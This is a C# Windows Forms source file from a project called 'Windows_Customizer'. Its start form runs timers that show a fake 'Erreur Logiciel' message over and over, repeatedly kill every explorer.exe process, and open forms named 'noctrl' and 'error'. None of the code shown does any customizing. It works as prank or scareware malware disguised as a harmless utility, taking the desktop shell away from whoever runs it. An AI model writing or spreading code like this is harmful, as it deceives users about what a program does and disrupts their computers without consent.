using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows_Customizer
{
    public partial class start : Form
    {
        public start()
        {
            InitializeComponent();
        }

        private void start_Load(object sender, EventArgs e)
        {
            timer3.Start();
            timer4.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            noctrl noctrl = new noctrl();
            noctrl.Show();
            

        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            error error = new error();
            error.Show();
            timer1.Stop();
            timer3.Stop();
            timer4.Stop();
            timer5.Stop();
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            MessageBox.Show("Erreur Logiciel");
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            try
            {
                Process[] _proceses = null;
                _proceses = Process.GetProcessesByName("explorer");
                foreach (Process proces in _proceses)
                {
                    proces.Kill();
                }
            }
            catch
            {

            }

            timer5.Start();
        }

        private void timer5_Tick(object sender, EventArgs e)
        {
            timer1.Start();
            timer2.Start();
        }
    }
}
